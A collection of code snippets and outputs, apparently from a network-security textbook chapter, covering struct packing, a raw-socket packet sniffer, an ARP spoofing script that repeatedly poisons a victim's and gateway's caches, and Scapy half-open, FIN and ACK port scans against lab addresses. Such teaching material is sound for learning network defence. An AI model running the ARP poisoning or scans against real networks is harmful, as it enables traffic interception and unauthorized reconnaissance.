["```py\nimport struct\nms=  struct.pack('hhl', 1, 2, 3)\nprint (ms)\nk= struct.unpack('hhl',ms)\nprint k\n```", "```py\nG:PythonNetworkingnetwork>python str1.py\n \u263b \u2665\n(1, 2, 3)\n```", "```py\nimport socket\nimport struct\nhost = \"192.168.0.1\"\nport = 12347\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind((host, port))\ns.listen(1)\nconn, addr = s.accept()\nprint \"connected by\", addr\nmsz= struct.pack('hhl', 1, 2, 3) \nconn.send(msz)\nconn.close()\n```", "```py\nimport socket\nimport struct \ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nhost = \"192.168.0.1\"\nport =12347\ns.connect((host,port))\nmsg= s.recv(1024)\nprint msg\nprint struct.unpack('hhl',msg)\ns.close()\n```", "```py\nC:network>python unstruc.py\n \u263b \u2665\n(1, 2, 3)\n```", "```py\nG:PythonNetworkingprogram>python struct1.py\nconnected by ('192.168.0.11', 1417)\n```", "```py\n >>> import struct\n >>> struct.pack('b',2)\n  'x02'\n  >>> struct.pack('B',2)\n  'x02'\n  >>> struct.pack('h',2)\n  'x02x00'\n```", "```py\n  >>> struct.pack('q',2)\n  'x02x00x00x00x00x00x00x00'\n```", "```py\n  >>> struct.pack('!q',2)\n  'x00x00x00x00x00x00x00x02'\n  >>>\n```", "```py\n  ifconfig eth0 promisc\n```", "```py\nimport socket\nimport struct\nimport binascii\ns = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)\nwhile True:\n  try:\n    pkt = s.recvfrom(2048)\n    ethhead = pkt[0][0:14]\n    eth = struct.unpack(\"!6s6s2s\",ethhead)\n    print \"*\"*50\n    print \"--------Ethernet Frame--------\"\n    print \"Source MAC --> Destination MAC\"\n    print binascii.hexlify(eth[1]),\"-->\",binascii.hexlify(eth[0])\n    print \"-----------IP------------------\"\n    num=pkt[0][14].encode('hex')\n    ip_length = (int(num)%10)*4\n    ip_last_range = 14+ip_length\n    ipheader = pkt[0][14:ip_last_range]\n    ip_hdr = struct.unpack(\"!12s4s4s\",ipheader)\n    print \"Source IP--> Destination IP\"\n    print socket.inet_ntoa(ip_hdr[1]),\"-->\", socket.inet_ntoa(ip_hdr[2])\n    print \"---------TCP----------\"\n    tcpheader = pkt[0][ip_last_range:ip_last_range+20]\n\n    tcp_hdr = struct.unpack(\"!HH9sB6s\",tcpheader)\n    print \"Source Port--> Destination Port\"\n    print tcp_hdr[0],\"-->\", tcp_hdr[1]\n    flag1 =tcp_hdr[3]\n    str1 = bin(flag1)[2:].zfill(8) \n    flag1 = ''\n    if str1[0]== '1':\n      flag1 = flag1+\"CWR \"\n    if str1[1] == '1':\n      flag1 = flag1+ \"ECN Echo \"\n    if str1[2] == '1':\n      flag1 = flag1 + \"Urgent \"\n    if str1[3]== '1':\n      flag1 = flag1+ \"Ack \"\n\n    if str1[4]== '1':\n      flag1 = flag1+\"Push \"\n    if str1[5] == '1':\n      flag1 = flag1+ \"Reset \"\n    if str1[6] == '1':\n      flag1 = flag1 + \"Sync \"\n    if str1[7]== '1':\n      flag1 = flag1+ \"Fin \"\n\n    print \"Flag\", flag1\n  except Exception as e :\n    print e\n\n```", "```py\n --------Ethernet Frame--------\nSource MAC --> Destination MAC\n005056e2859d --> 000c29436fc7\n-----------IP------------------\nSource IP--> Destination IP\n91.198.174.192 --> 192.168.0.24\n---------TCP----------\nSource Port--> Destination Port\n443 --> 43885\nFlag Ack Push Fin \n\n**************************************************\n--------Ethernet Frame--------\nSource MAC --> Destination MAC\n005056e2859d --> 000c29436fc7\n-----------IP------------------\nSource IP--> Destination IP\n91.198.174.192 --> 192.168.0.24\n---------TCP----------\nSource Port--> Destination Port\n443 --> 43851\nFlag Ack \n```", "```py\n >>> import socket\n >>> socket.gethostbyaddr('91.198.174.192')\n('text-lb.esams.wikimedia.org', [], ['91.198.174.192'])\n>>>\n```", "```py\nprint pkt[0][ip_last_range+20:]\n```", "```py\n  HTTP/1.1 304 Not Modified\n  Server: Apache\n  X-Content-Type-Options: nosniff\n  Cache-control: public, max-age=300, s-maxage=300\n  Last-Modified: Thu, 25 Sep 2014 18:08:15 GMT\n  Expires: Sat, 27 Sep 2014 06:41:45 GMT\n  Content-Encoding: gzip\n  Content-Type: text/javascript; charset=utf-8\n  Vary: Accept-Encoding,X-Use-HHVM\n  Accept-Ranges: bytes\n  Date: Sat, 27 Sep 2014 06:37:02 GMT\n  X-Varnish: 3552654421 3552629562\n  Age: 17\n  Via: 1.1 varnish\n  Connection: keep-alive\n  X-Cache: cp1057 hit (138)\n  X-Analytics: php=zend\n```", "```py\n    ipheader = pkt[0][14:ip_last_range]\n    ip_hdr = struct.unpack(\"!8sB3s4s4s\",ipheader)\n    print \"Source IP--> Destination IP, \"\n    print socket.inet_ntoa(ip_hdr[3]),\"-->\", socket.inet_ntoa(ip_hdr[4])\n    print \"TTL: \",ip_hdr[1]\n```", "```py\n --------Ethernet Frame--------\nSource MAC --> Destination MAC\n005056e2859d --> 000c29436fc7\n-----------IP------------------\nSource IP--> Destination IP\n74.125.24.157 --> 192.168.0.24\nTTL: 128\n---------TCP----------\nSource Port--> Destination Port\n443 --> 48513\n16\nFlag Ack \n```", "```py\nimport socket\ns = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))\ns.bind((\"eth0\",socket.htons(0x0800)))\nsor = 'x00x0cx29x4fx8ex35'\ndes ='x00x0Cx29x2Ex84x7A'\ncode ='x08x00'\neth = des+sor+code\ns.send(eth)\n```", "```py\nimport socket\nimport struct\nimport binascii\ns = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))\ns.bind((\"eth0\",socket.htons(0x0800)))\n\nsor = 'x00x0cx29x4fx8ex35'\nvictmac ='x00x0Cx29x2Ex84x7A'\n\ngatemac = 'x00x50x56xC0x00x08'\ncode ='x08x06'\neth1 = victmac+sor+code #for victim\neth2 = gatemac+sor+code # for gateway\n\nhtype = 'x00x01'\nprotype = 'x08x00'\nhsize = 'x06'\npsize = 'x04'\nopcode = 'x00x02'\n\ngate_ip = '192.168.0.1'\nvictim_ip = '192.168.0.11' \ngip = socket.inet_aton ( gate_ip )\nvip = socket.inet_aton ( victim_ip )\n\narp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip\narp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip\n\nwhile 1:\n  s.send(arp_victim)\n  s.send(arp_gateway)\n```", "```py\nfrom scapy.all import *\nip1 = IP(src=\"img/192.168.0.10\", dst =\"192.168.0.3\" )\ntcp1 = TCP(sport =1024, dport=80, flags=\"S\", seq=12345)\npacket = ip1/tcp1\np =sr1(packet, inter=1)\np.show()\n\nrs1 = TCP(sport =1024, dport=80, flags=\"R\", seq=12347)\npacket1=ip1/rs1\np1 = sr1(packet1)\np1.show\n```", "```py\n  root@Mohit|Raj:/scapy# python halfopen.py\n  WARNING: No route found for IPv6 destination :: (no default route?)\n  Begin emission:\n  .*Finished to send 1 packets.\n  Received 2 packets, got 1 answers, remaining 0 packets\n  ###[ IP ]###\n    version   = 4L\n    ihl       = 5L\n    tos       = 0x0\n    len       = 44\n    id        = 0\n    flags     = DF\n    frag      = 0L\n    ttl       = 64\n    proto     = tcp\n    chksum    = 0xb96e\n    src       = 192.168.0.3\n    dst       = 192.168.0.10\n  options \n  ###[ TCP ]###\n       sport     = http\n       dport     = 1024\n       seq       = 2065061929\n       ack       = 12346\n       dataofs   = 6L\n       reserved  = 0L\n       flags     = SA\n       window    = 5840\n       chksum    = 0xf81e\n       urgptr    = 0\n       options   = [('MSS', 1460)]\n  ###[ Padding ]###\n          load      = 'x00x00'\n  Begin emission:\n  Finished to send 1 packets.\n  ..^Z\n  [10]+  Stopped python halfopen.py\n```", "```py\n  root@Mohit|Raj:/scapy# python halfopen.py \n  WARNING: No route found for IPv6 destination :: (no default route?)\n  Begin emission:\n  .*Finished to send 1 packets.\n  Received 2 packets, got 1 answers, remaining 0 packets\n  ###[ IP ]###\n    version   = 4L\n    ihl       = 5L\n    tos       = 0x0\n    len       = 40\n    id        = 37929\n  flags     = \n    frag      = 0L\n    ttl       = 128\n    proto     = tcp\n    chksum    = 0x2541\n    src       = 192.168.0.11\n    dst       = 192.168.0.10\n  options \n  ###[ TCP ]###\n       sport     = http\n       dport     = 1024\n       seq       = 0\n       ack       = 12346\n       dataofs   = 5L\n       reserved  = 0L\n       flags     = RA\n       window    = 0\n       chksum    = 0xf9e0\n       urgptr    = 0\n       options   = {}\n  ###[ Padding ]###\n          load      = 'x00x00x00x00x00x00'\n  Begin emission:\n  Finished to send 1 packets.\n  ^Z\n  [12]+  Stopped                 python halfopen.py\n  root@Mohit|Raj:/scapy#\n```", "```py\nfrom scapy.all import *\nip1 = IP(src=\"img/192.168.0.10\", dst =\"192.168.0.11\")\nsy1 = TCP(sport =1024, dport=80, flags=\"F\", seq=12345)\npacket = ip1/sy1\np =sr1(packet)\np.show()\n```", "```py\nroot@Mohit|Raj:/scapy# python fin.py \nWARNING: No route found for IPv6 destination :: (no default route?)\nBegin emission:\n.Finished to send 1 packets.\n*\nReceived 2 packets, got 1 answers, remaining 0 packets\n###[ IP ]###\n  version   = 4L\n  ihl       = 5L\n  tos       = 0x0\n  len       = 40\n  id        = 38005\n  flags     = \n  frag      = 0L\n  ttl       = 128\n  proto     = tcp\n  chksum    = 0x24f5\n  src       = 192.168.0.11\n  dst       = 192.168.0.10\n  options   \n###[ TCP ]###\n     sport     = http\n     dport     = 1024\n     seq       = 0\n     ack       = 12346\n     dataofs   = 5L\n     reserved  = 0L\n     flags     = RA\n     window    = 0\n     chksum    = 0xf9e0\n     urgptr    = 0\n     options   = {}\n###[ Padding ]###\n        load      = 'x00x00x00x00x00x00'\n```", "```py\nroot@Mohit|Raj:/scapy# python fin.py \nWARNING: No route found for IPv6 destination :: (no default route?)\nBegin emission:\n.Finished to send 1 packets.\n....^Z\n[13]+  Stopped                 python fin.py\n```", "```py\nfrom scapy.all import *\nip1 = IP(src=\"img/192.168.0.10\", dst =\"192.168.0.11\")\nsy1 = TCP(sport =1024, dport=137, flags=\"A\", seq=12345)\npacket = ip1/sy1\np =sr1(packet)\np.show()\n```", "```py\n  root@Mohit|Raj:/scapy# python ack.py \n  WARNING: No route found for IPv6 destination :: (no default route?)\n  Begin emission:\n  ..Finished to send 1 packets.\n  ^Z\n  [30]+  Stopped                 python ack.py\n```", "```py\n  Out-put of sniffer \n   --------Ethernet Frame--------\n  desination mac 000c294f8e35\n  Source mac 000c292e847a\n  -----------IP------------------\n  TTL : 128\n  Source IP 192.168.0.11\n  Destination IP 192.168.0.10\n  ---------TCP----------\n  Source Port  137\n  Destination port  1024\n  Flag  04\n```", "```py\n  root@Mohit|Raj:/scapy# python ack.py \n  WARNING: No route found for IPv6 destination :: (no default route?)\n  Begin emission:\n  .Finished to send 1 packets.\n```"]